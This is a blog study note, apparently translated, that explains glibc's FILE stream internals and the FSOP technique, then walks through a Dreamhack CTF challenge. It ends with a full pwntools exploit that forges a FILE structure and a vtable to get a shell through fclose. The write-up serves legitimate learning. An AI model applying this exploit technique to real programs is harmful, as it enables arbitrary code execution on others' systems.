---
title: "[PWNABLE]FSOP"
description: "FSOPFile Stream Oriented Programming This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.file stream structure"
date: "2024-06-24"
translation_key: "tistory-8af5082e9c5d"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-FSOP"
private: false
---

### FSOP  
  

File Stream Oriented Programming

This is an attack technique that executes malicious code by manipulating the internal fields of the file stream in libc, the standard library of C. In libc, file streams are managed by the FILE structure, and the fields of this structure abstract file input/output operations.

- Understanding the file stream structure: You must analyze the FILE structure of libc to understand the fields.

\_IO\_FILE: A structure to represent a file stream in the standard library of the Linux system.

```
struct _IO_FILE_plus
{
FILE file;
  const struct _IO_jump_t *vtable;
};
struct _IO_FILE
{
  int _flags;
  char *_IO_read_ptr;
  char *_IO_read_end;
  char *_IO_read_base;
  char *_IO_write_base;
  char *_IO_write_ptr;
  char *_IO_write_end;
  char *_IO_buf_base;
  char *_IO_buf_end;
  char *_IO_save_base;
  char *_IO_backup_base;
  char *_IO_save_end;
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset;
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

\_flags: Permissions for files 

(0xfbad0000 is the magic number)

\_IO\_read\_ptr / \_IO\_write\_ptr: Buffer pointer for reading and writing files.

\_IO\_read\_base / \_IO\_write\_base: Pointer to the starting address of the file read and write buffer.

\_IO\_read\_end / \_IO\_write\_end: Pointer to the end of the file read and write buffer.

\_chain: Field to create a linked list

\_fileno: File descriptor value

\_IO\_jump\_t\*vatlbe: Virtual table that performs file-related operations.

```
FILE *_IO_new_file_fopen(FILE *fp, const char
*filename, const char *mode,
                         int is32not64) {
  int oflags = 0, omode;
  int read_write;
  int oprot = 0666;
  int i;
  FILE *result;
  const char *cs;
  const char *last_recognized;
  if (_IO_file_is_open(fp)) return 0;
  switch (*mode) {
    case 'r':
      omode = O_RDONLY;
      read_write = _IO_NO_WRITES;
      break;
    case 'w':
      omode = O_WRONLY;
      oflags = O_CREAT | O_TRUNC;
      read_write = _IO_NO_READS;
      break;
    case 'a':
      omode = O_WRONLY;
      oflags = O_CREAT | O_APPEND;
      read_write = _IO_NO_READS | _IO_IS_APPENDING;
      break;
      ...
}
```

When opening a file with fopne, set the mode value by passing the \_flags variable.

Check and set permissions in the \_IO\_new\_file\_fopne function.

**\_IO\_FILE : vtable**

This is a table allocated when using class definitions and virtual functions in object-oriented programming languages.

When the address of a virtual function is stored and used in memory, the relative address is called based on the table.

```
                               #define fread(p, m, n, s) _IO_fread (p, m, n, s)
                               size_t
                               _IO_fread (void *buf, size_t size, size_t count, FILE
                               *fp)
                               {
                                 size_t bytes_requested = size * count;
                                 size_t bytes_read;
                                 CHECK_FILE (fp, 0);
                                 if (bytes_requested == 0)
                                   return 0;
                                 _IO_acquire_lock (fp);
                                 _IO_release_lock (fp);
                                 return bytes_requested == bytes_read ? count :
                               bytes_read / size;
                               }
```

This is the process of calling the fread function.

In the code above, the \_IO\_sgetn function is called.

```
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
DATA, N)
#define JUMP2(FUNC, THIS, X1, X2)
(_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
( (THIS)))
size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
```

Call \_IO\_XSGETN from the \_IO\_sgetn function.

The \_IO\_XSGETN function is a function included in the vtable structure.

You can check that file functions, including the fread function, refer to the vtable variable.

```
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
DATA, N)
#define JUMP2(FUNC, THIS, X1, X2)
(_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
( (THIS)))
size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  return _IO_XSGETN (fp, data, n);
}
```

In the process of referencing the vtable, IO\_validate\_vatlbe() is called.

Allocate vtable in the \_libc\_IO\_vtables section.

```
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the
__libc_IO_vtables
section. */
uintptr_t section_length = __stop___libc_IO_vtables
- __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected
section.  Use the
       slow path, which will terminate the process if
necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

Determine the size of the session using the start/end addresses of the vtable.

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
      return EOF;
      else
      {
        char *new_buf;
        char *old_buf = fp->_IO_buf_base;
        size_t old_blen = _IO_blen (fp);
        _IO_size_t new_size = 2 * old_blen + 100;
        if (new_size < old_blen)
          return EOF;
        new_buf
          = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

\_IO\_str\_overflow is included in \_libc\_IO\_vtables.

At the end, call the \_s.\_allocate\_buffer function pointer.

```
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
if (new_size < old_blen)
return EOF;
```

Pass the new\_size variable as a function argument.

Use the operation values ​​of \_IO\_buf\_end and \_IO\_buf\_base.

With this, you can manipulate the new\_size variable.

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
if (fp->_flags & _IO_NO_WRITES)
    return flush_only ? 0 : EOF;
if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
  {
    fp->_flags |= _IO_CURRENTLY_PUTTING;
    fp->_IO_write_ptr = fp->_IO_read_ptr;
    fp->_IO_read_ptr = fp->_IO_read_end;
}
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
  {
    if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
    else
    {
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

This is the code that must be checked to call the function pointer.

I will separate that part and check.

```
 int flush_only = c == EOF;
 _IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
 if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

Use \_IO\_write\_base and \_IO\_write\_ptr.

The initial value of flush\_only is 0.

If you look at the condition part, it is if(pos >= \_IO\_blen(fp)).

\_IO\_write\_ptr = func@add  
\_IO\_write\_base = 0  
pos = func@add

I will solve Bypass \_IO\_str\_overflow among the dreamhack problems.

```
#include <stdio.h>
#include <unistd.h>
FILE *fp;
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}
int main() {
  init();
  fp = fopen("/dev/urandom", "r");
  printf("stdout: %p\n", stdout);
  printf("Data: ");
  read(0, fp, 300);
  fclose(fp);
}
```

Because it outputs the address of the stdout pointer, you can obtain libc\_base.

```
p.recvuntil("stdout: ")
stdout_leak = int(p.recvuntil(b"\n").strip(b"\n"),16)
libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search(b"/bin/sh"))
system_add = libc_base + libc.symbols['system']
fp = elf.symbols['fp']
```

This is the process of obtaining libc\_base and the necessary addresses.

Additionally, you can obtain the fake\_vtable address.

Because the new\_size variable is obtained using \_IO\_buf\_end and base,

If you set \_IO\_buf\_end to the binsh string address and base to 0,

The new\_size variable points to the binsh string.

Looking at the conditions again

```
 int flush_only = c == EOF;
 _IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
 if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

\_IO\_write\_ptr and \_IO\_buf\_end must be set identically.

This is to pass the condition of \-> \_IO\_str\_overflow.

```
       new_buf
         = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer)
(new_size);
```

At the end of the code, call \_IO\_FINISH inside the fclose function.

\_IO\_FINISH calls the address located 16 bytes away from the vatble address.

\=> If the vtable address is covered with the (IO\_str\_overflow - 16) address, the IO\_str\_overflow function is called by fcloase.

```
from pwn import *

p = remote('host3.dreamhack.games', 15070)
libc = ELF('./libc.so.6')
elf = ELF('./bypass_valid_vtable')

p.recvuntil("stdout: ")
stdout_leak = int(p.recvuntil(b"\n").strip(b"\n"),16)
libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']

io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search(b"/bin/sh"))
system_add = libc_base + libc.symbols['system']
fp = elf.symbols['fp']

payload = p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(int((binsh - 100) / 2))
payload += p64(0x0)
payload += p64(0x0)
payload += p64(int((binsh - 100) / 2))
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(fp + 0x80)
payload += p64(0x0)*9
payload += p64(fake_vtable)
payload += p64(system_add)
p.sendline(payload)

p.interactive()
```

If you run it, you can get the flag.

![](/assets/images/tistory/tistory-8af5082e9c5d/001.png)